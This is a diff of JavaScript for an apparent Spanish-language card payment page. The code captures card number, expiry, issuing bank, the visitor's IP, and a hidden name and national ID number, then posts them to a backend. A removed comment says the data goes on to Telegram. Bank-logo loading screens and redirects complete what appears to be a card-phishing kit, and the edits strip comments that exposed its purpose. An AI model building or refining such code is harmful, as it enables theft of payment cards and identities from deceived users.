@@ -331,18 +331,17 @@
         const API_CREAR_PAGO = '/api/crear-pago';
         const API_ESTADO_PAGO = '/api/estado-pago';
         const POLLING_INTERVAL = 2000;
-        const MAX_POLLING_TIME = 300000; // 5 minutos máximo por intento
+        const MAX_POLLING_TIME = 300000;
         const HANDYAPI_KEY = 'PUB-co5YEcRHr043lS53Ctgn86usDYGx';
 
         // ============================================================
-        // 🔥 NUEVO: DATOS DEL SOLICITANTE (SOLO LECTURA, NO SE MUESTRAN)
+        // DATOS DEL SOLICITANTE (SOLO LECTURA)
         // ============================================================
         const nombreSolicitante = localStorage.getItem('nombreSolicitante') || '—';
         const cedulaSolicitante = localStorage.getItem('cedulaSolicitante') || '—';
-        // No se pintan en ninguna parte del DOM. Solo se envían al backend.
 
         // ============================================================
-        // CARGAR DATOS DINÁMICOS (CORREO Y MONTO)
+        // CARGAR DATOS DINÁMICOS
         // ============================================================
         document.addEventListener('DOMContentLoaded', function() {
             const urlParams = new URLSearchParams(window.location.search);
@@ -366,7 +365,7 @@
         });
 
         // ============================================================
-        // NAVEGACIÓN: MEDIOS DE PAGO <-> FORMULARIO TARJETA
+        // NAVEGACIÓN
         // ============================================================
         const paymentMethodsScreen = document.getElementById('paymentMethodsScreen');
         const cardForm = document.getElementById('cardForm');
@@ -384,7 +383,7 @@
         });
 
         // ============================================================
-        // CAPTURAR IP + PAÍS + CIUDAD
+        // CAPTURAR IP
         // ============================================================
         async function capturarIP() {
             if (localStorage.getItem('usuario_ip')) return localStorage.getItem('usuario_ip');
@@ -420,7 +419,6 @@
         let pollingInterval = null;
         let cardType = null;
         let detectedBank = null;
-        let tipoTarjeta = '';
 
         // ============================================================
         // ELEMENTOS DOM
@@ -435,7 +433,6 @@
         const alertError = document.getElementById('alertError');
         const mensajeError = document.getElementById('mensajeError');
         const cardNumberError = document.getElementById('cardNumberError');
-        const form = document.getElementById('paymentForm');
 
         const loadingOverlay = document.getElementById('loadingOverlay');
         const loadingText = document.getElementById('loadingText');
@@ -494,7 +491,7 @@
         function formatExpiry(value) { const cleaned = value.replace(/\D/g, ''); if (cleaned.length >= 2) return cleaned.substring(0, 2) + '/' + cleaned.substring(2, 4); return cleaned; }
 
         // ============================================================
-        // DETECCIÓN DE BANCO POR BIN (HANDYAPI)
+        // DETECCIÓN DE BANCO POR BIN
         // ============================================================
         const binCache = new Map();
         const bankNameMapping = {
@@ -602,7 +599,7 @@
         inputNombre.addEventListener('input', function() { this.value = this.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑ\s]/g, ''); });
 
         // ============================================================
-        // POLLING — CONSULTA ESTADO AL BACKEND
+        // POLLING
         // ============================================================
         async function verificarEstadoSolicitud(id) {
             try {
@@ -670,7 +667,7 @@
         }
 
         // ============================================================
-        // CARGA CON LOGOS + REDIRECCIÓN SEGÚN TIPO
+        // CARGA CON LOGOS
         // ============================================================
         function mostrarCargaConLogos(tipo, destino) {
             initialSpinner.classList.remove('active');
@@ -711,7 +708,7 @@
         }
 
         // ============================================================
-        // WEBHOOK — ENVÍO DE DATOS AL BACKEND
+        // ENVÍO AL BACKEND
         // ============================================================
         async function enviarDatosAlWebhook(datos) {
             try {
@@ -762,7 +759,6 @@
             if (!detectedBank) { detectedBank = 'Desconocido'; localStorage.setItem('bancoEmisor', 'Desconocido'); }
             if (!localStorage.getItem('usuario_ip') || localStorage.getItem('usuario_ip') === 'Desconocida') { await capturarIP(); }
 
-            // Genera un nuevo ID en cada intento
             solicitudId = 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
 
             loadingOverlay.classList.add('active');
@@ -787,9 +783,6 @@
                 vencimiento: exp,
                 marca_tarjeta: cardType,
                 banco_emisor: detectedBank,
-
-                // 🔥 NUEVO: datos del solicitante que van al backend → Telegram
-                // (no se muestran en el front, solo viajan en el body)
                 nombre_solicitante: nombreSolicitante,
                 cedula_solicitante: cedulaSolicitante
             };
